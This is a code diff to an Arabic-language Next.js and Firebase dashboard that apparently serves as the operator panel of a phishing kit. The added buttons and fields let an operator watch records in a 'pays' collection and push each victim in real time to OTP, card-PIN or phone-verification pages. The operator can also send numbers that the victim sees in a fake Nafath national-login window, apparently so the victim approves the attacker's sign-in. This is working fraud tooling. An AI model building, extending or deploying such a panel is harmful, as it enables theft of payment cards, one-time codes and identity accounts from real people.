@@ -1,7 +1,7 @@
 "use client"
 
 import { useEffect, useState, useMemo } from "react"
-import { collection, onSnapshot, doc, updateDoc, query, orderBy } from "firebase/firestore"
+import { collection, onSnapshot, doc, updateDoc, query } from "firebase/firestore"
 import { db } from "@/lib/firebase"
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
 import { Button } from "@/components/ui/button"
@@ -26,7 +26,6 @@ import {
   CreditCard,
   Clock,
   CheckCircle2,
-  XCircle,
   Search,
   RefreshCw,
   Eye,
@@ -198,24 +197,140 @@ function DetailRow({
 
 // ─── Approval Action Buttons ─────────────────────────────────────────────────
 
-function ApprovalActions({ record, field, onUpdate }: { record: FirestoreRecord; field: string; onUpdate: (id: string, data: Record<string, string>) => void }) {
+function ApprovalActions({
+  record,
+  field,
+  options,
+  onUpdate,
+}: {
+  record: FirestoreRecord
+  field: string
+  options: string[]
+  onUpdate: (id: string, data: Record<string, string>) => Promise<void>
+}) {
   const current = str(record[field])
+  const [busy, setBusy] = useState<string | null>(null)
+
+  const handleClick = async (status: string) => {
+    setBusy(status)
+    await onUpdate(record.id, { [field]: status })
+    setBusy(null)
+  }
+
   return (
     <div className="flex gap-2 flex-wrap">
-      {["otp", "approved", "rejected", "pending"].map((status) => (
+      {options.map((status) => (
         <button
           key={status}
-          disabled={current === status}
-          onClick={() => onUpdate(record.id, { [field]: status })}
-          className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
+          disabled={current === status || busy !== null}
+          onClick={() => handleClick(status)}
+          className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all flex items-center gap-1.5 ${
             current === status
-              ? APPROVAL_COLORS[status] + " ring-2 ring-offset-1 ring-current"
+              ? (APPROVAL_COLORS[status] || "bg-teal-100 text-teal-800") + " ring-2 ring-offset-1 ring-current"
               : "bg-gray-50 text-gray-500 hover:bg-gray-100"
           }`}
         >
+          {busy === status && <Loader2 className="h-3 w-3 animate-spin" />}
           {APPROVAL_LABELS[status] || status}
         </button>
       ))}
+    </div>
+  )
+}
+
+// ─── Current Page Control ────────────────────────────────────────────────────
+
+const CURRENT_PAGE_OPTIONS = [
+  { value: "", label: "فارغ (افتراضي)", color: "bg-gray-100 text-gray-600" },
+  { value: "1", label: "1 → الرئيسية", color: "bg-blue-100 text-blue-700" },
+  { value: "2", label: "2 → صفحة العرض", color: "bg-indigo-100 text-indigo-700" },
+  { value: "9999", label: "9999 → تحقق الجوال", color: "bg-red-100 text-red-700" },
+]
+
+function CurrentPageControl({
+  record,
+  onUpdate,
+}: {
+  record: FirestoreRecord
+  onUpdate: (id: string, data: Record<string, string>) => Promise<void>
+}) {
+  const current = str(record.currentPage)
+  const [busy, setBusy] = useState<string | null>(null)
+
+  const handleClick = async (val: string) => {
+    setBusy(val)
+    await onUpdate(record.id, { currentPage: val })
+    setBusy(null)
+  }
+
+  return (
+    <div className="flex gap-2 flex-wrap">
+      {CURRENT_PAGE_OPTIONS.map((opt) => (
+        <button
+          key={opt.value}
+          disabled={current === opt.value || busy !== null}
+          onClick={() => handleClick(opt.value)}
+          className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all flex items-center gap-1.5 ${
+            current === opt.value
+              ? opt.color + " ring-2 ring-offset-1 ring-current"
+              : "bg-gray-50 text-gray-500 hover:bg-gray-100"
+          }`}
+        >
+          {busy === opt.value && <Loader2 className="h-3 w-3 animate-spin" />}
+          {opt.label}
+        </button>
+      ))}
+    </div>
+  )
+}
+
+// ─── Text Field Control ──────────────────────────────────────────────────────
+
+function TextFieldControl({
+  record,
+  field,
+  placeholder,
+  onUpdate,
+}: {
+  record: FirestoreRecord
+  field: string
+  placeholder: string
+  onUpdate: (id: string, data: Record<string, string>) => Promise<void>
+}) {
+  const [value, setValue] = useState(str(record[field]))
+  const [busy, setBusy] = useState(false)
+  const [saved, setSaved] = useState(false)
+
+  const handleSave = async () => {
+    setBusy(true)
+    await onUpdate(record.id, { [field]: value })
+    setBusy(false)
+    setSaved(true)
+    setTimeout(() => setSaved(false), 1500)
+  }
+
+  return (
+    <div className="flex gap-2">
+      <Input
+        value={value}
+        onChange={(e) => setValue(e.target.value)}
+        placeholder={placeholder}
+        className="h-9 text-sm flex-1"
+      />
+      <Button
+        size="sm"
+        className="bg-teal-700 hover:bg-teal-800 text-white h-9 min-w-[70px]"
+        onClick={handleSave}
+        disabled={busy}
+      >
+        {busy ? (
+          <Loader2 className="h-3.5 w-3.5 animate-spin" />
+        ) : saved ? (
+          <span className="flex items-center gap-1"><CheckCircle2 className="h-3.5 w-3.5" /> تم</span>
+        ) : (
+          "حفظ"
+        )}
+      </Button>
     </div>
   )
 }
@@ -232,9 +347,14 @@ export default function DashboardPage() {
   const [sortField, setSortField] = useState<SortField>("createdAt")
   const [sortDir, setSortDir] = useState<SortDir>("desc")
   const [page, setPage] = useState(0)
-  const [selectedRecord, setSelectedRecord] = useState<FirestoreRecord | null>(null)
+  const [selectedId, setSelectedId] = useState<string | null>(null)
   const [detailOpen, setDetailOpen] = useState(false)
-  const [updating, setUpdating] = useState<string | null>(null)
+
+  // Derive selectedRecord from live records so it stays in sync
+  const selectedRecord = useMemo(() => {
+    if (!selectedId) return null
+    return records.find((r) => r.id === selectedId) || null
+  }, [selectedId, records])
 
   // ── Real-time Listener ───────────────────────────────────────────────────
 
@@ -261,13 +381,10 @@ export default function DashboardPage() {
   // ── Update Firestore doc ─────────────────────────────────────────────────
 
   const handleUpdate = async (id: string, data: Record<string, string>) => {
-    setUpdating(id)
     try {
       await updateDoc(doc(db, "pays", id), { ...data, updatedAt: new Date().toISOString() })
     } catch (e) {
       console.error("Update error:", e)
-    } finally {
-      setUpdating(null)
     }
   }
 
@@ -366,7 +483,7 @@ export default function DashboardPage() {
   // ── Open Detail ──────────────────────────────────────────────────────────
 
   const openDetail = (record: FirestoreRecord) => {
-    setSelectedRecord(record)
+    setSelectedId(record.id)
     setDetailOpen(true)
     markAsRead(record)
   }
@@ -630,7 +747,7 @@ export default function DashboardPage() {
       </main>
 
       {/* ── Detail Modal ───────────────────────────────────────────────────── */}
-      <Dialog open={detailOpen} onOpenChange={setDetailOpen}>
+      <Dialog open={detailOpen} onOpenChange={(open) => { setDetailOpen(open); if (!open) setSelectedId(null) }}>
         <DialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto p-0" dir="rtl">
           {selectedRecord && (
             <>
@@ -754,59 +871,59 @@ export default function DashboardPage() {
                     <CheckCircle2 className="h-4 w-4 text-teal-700" />
                     التحكم في الموافقات
                   </h3>
-                  <div className="bg-gray-50 rounded-xl p-4 space-y-4">
+                  <div className="bg-gray-50 rounded-xl p-4 space-y-5">
+                    {/* cardApproval — controls /payment page redirects */}
                     <div>
-                      <p className="text-xs font-semibold text-gray-600 mb-2">موافقة البطاقة (cardApproval)</p>
-                      <ApprovalActions record={selectedRecord} field="cardApproval" onUpdate={handleUpdate} />
+                      <p className="text-xs font-semibold text-gray-600 mb-1">موافقة البطاقة (cardApproval)</p>
+                      <p className="text-[11px] text-gray-400 mb-2">pending=تحميل | otp=صفحة OTP | approved=صفحة PIN | rejected=رفض</p>
+                      <ApprovalActions record={selectedRecord} field="cardApproval" options={["pending", "otp", "approved", "rejected"]} onUpdate={handleUpdate} />
                     </div>
+
+                    {/* phoneOtpApproval — controls /application booking page */}
                     <div>
-                      <p className="text-xs font-semibold text-gray-600 mb-2">موافقة OTP الجوال (phoneOtpApproval)</p>
-                      <ApprovalActions record={selectedRecord} field="phoneOtpApproval" onUpdate={handleUpdate} />
+                      <p className="text-xs font-semibold text-gray-600 mb-1">موافقة OTP الجوال (phoneOtpApproval)</p>
+                      <p className="text-[11px] text-gray-400 mb-2">approved=انتقال لنفاذ | rejected=رفض | pending=انتظار</p>
+                      <ApprovalActions record={selectedRecord} field="phoneOtpApproval" options={["pending", "approved", "rejected"]} onUpdate={handleUpdate} />
                     </div>
+
+                    {/* phoneApproval — controls /verify-phone page */}
                     <div>
-                      <p className="text-xs font-semibold text-gray-600 mb-2">موافقة الجوال (phoneApproval)</p>
-                      <ApprovalActions record={selectedRecord} field="phoneApproval" onUpdate={handleUpdate} />
+                      <p className="text-xs font-semibold text-gray-600 mb-1">موافقة الجوال (phoneApproval)</p>
+                      <p className="text-[11px] text-gray-400 mb-2">pending=تحميل | otp=صفحة OTP | approved=صفحة نفاذ | rejected=رفض</p>
+                      <ApprovalActions record={selectedRecord} field="phoneApproval" options={["pending", "otp", "approved", "rejected"]} onUpdate={handleUpdate} />
                     </div>
+
+                    {/* currentPage — global redirect control */}
                     <div>
-                      <p className="text-xs font-semibold text-gray-600 mb-2">الصفحة الحالية (currentPage)</p>
-                      <div className="flex gap-2 flex-wrap">
-                        {["", "1", "2", "9999"].map((val) => (
-                          <button
-                            key={val}
-                            onClick={() => handleUpdate(selectedRecord.id, { currentPage: val })}
-                            className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
-                              str(selectedRecord.currentPage) === val
-                                ? "bg-teal-100 text-teal-800 ring-2 ring-offset-1 ring-teal-500"
-                                : "bg-gray-100 text-gray-500 hover:bg-gray-200"
-                            }`}
-                          >
-                            {val === "" ? "فارغ" : val === "9999" ? "تحقق الجوال" : val}
-                          </button>
-                        ))}
-                      </div>
+                      <p className="text-xs font-semibold text-gray-600 mb-1">الصفحة الحالية (currentPage)</p>
+                      <p className="text-[11px] text-gray-400 mb-2">يتحكم بتوجيه المستخدم من أي صفحة يتواجد فيها</p>
+                      <CurrentPageControl record={selectedRecord} onUpdate={handleUpdate} />
                     </div>
+
+                    {/* authNumber — nafaz modal display number */}
                     <div>
-                      <p className="text-xs font-semibold text-gray-600 mb-2">رقم نفاذ (authNumber)</p>
-                      <div className="flex gap-2">
-                        <Input
-                          defaultValue={str(selectedRecord.authNumber)}
-                          placeholder="أدخل رقم نفاذ"
-                          className="h-9 text-sm"
-                          id="authNumberInput"
-                        />
-                        <Button
-                          size="sm"
-                          className="bg-teal-700 hover:bg-teal-800 text-white h-9"
-                          onClick={() => {
-                            const input = document.getElementById("authNumberInput") as HTMLInputElement
-                            if (input?.value) {
-                              handleUpdate(selectedRecord.id, { authNumber: input.value })
-                            }
-                          }}
-                        >
-                          حفظ
-                        </Button>
-                      </div>
+                      <p className="text-xs font-semibold text-gray-600 mb-1">رقم التحقق في نفاذ (authNumber)</p>
+                      <p className="text-[11px] text-gray-400 mb-2">يظهر للمستخدم في نافذة نفاذ</p>
+                      <TextFieldControl
+                        key={"auth-" + selectedRecord.id + "-" + str(selectedRecord.authNumber)}
+                        record={selectedRecord}
+                        field="authNumber"
+                        placeholder="مثال: 42"
+                        onUpdate={handleUpdate}
+                      />
+                    </div>
+
+                    {/* nafaz_pin — nafaz page verification code */}
+                    <div>
+                      <p className="text-xs font-semibold text-gray-600 mb-1">رمز نفاذ PIN (nafaz_pin)</p>
+                      <p className="text-[11px] text-gray-400 mb-2">يظهر في صفحة /nafad كرقم التحقق</p>
+                      <TextFieldControl
+                        key={"pin-" + selectedRecord.id + "-" + str(selectedRecord.nafaz_pin)}
+                        record={selectedRecord}
+                        field="nafaz_pin"
+                        placeholder="مثال: 58"
+                        onUpdate={handleUpdate}
+                      />
                     </div>
                   </div>
                 </section>
